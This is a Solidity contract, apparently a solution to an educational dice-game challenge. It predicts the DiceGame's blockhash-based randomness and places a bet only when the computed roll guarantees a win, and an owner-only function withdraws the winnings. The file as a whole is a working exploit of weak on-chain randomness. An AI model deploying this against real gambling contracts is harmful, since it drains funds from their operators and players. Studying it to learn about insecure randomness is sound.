// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/// @title RiggedRoll - A contract that can predict the randomness in the DiceGame contract and
///        only initiates a roll when it guarantees a win.
contract RiggedRoll is Ownable {

    uint256 public constant MIN_AMOUNT = 0.002 ether;
    DiceGame public immutable diceGame;

    event Withdrawn(uint256 amount);
    event RiggedRolled();

    error NotEnoughBalance(uint256 balance, uint256 required);
    error FailedToTransferEth();
    error NotRiggedRolled();

    /// @notice Create a new RiggedRoll contract.
    /// @param diceGameAddress The address of the DiceGame contract.
    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    /// @notice Withdraw Ether from the rigged contract to a specified address.
    /// @param _addr The address to withdraw Ether to.
    /// @param _amount The amount of Ether to withdraw.
    /// @dev Only the owner of the rigged contract can call this function.
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        emit Withdrawn(_amount);
        (bool success,) = _addr.call{value: _amount}("");
        if (!success) {
            revert FailedToTransferEth();
        }
    }

    /// @notice Predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    /// @dev Can only call this function when the contract has the min amount of balance.
    function riggedRoll() external {
        if (address(this).balance < MIN_AMOUNT) {
            revert NotEnoughBalance(address(this).balance, MIN_AMOUNT);
        }
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        if (roll <= 5) {
            emit RiggedRolled();
            diceGame.rollTheDice{value: MIN_AMOUNT}();
        } else {
            revert NotRiggedRolled();
        }
    }

    /// @notice Receives ether.
    receive() external payable {}

}
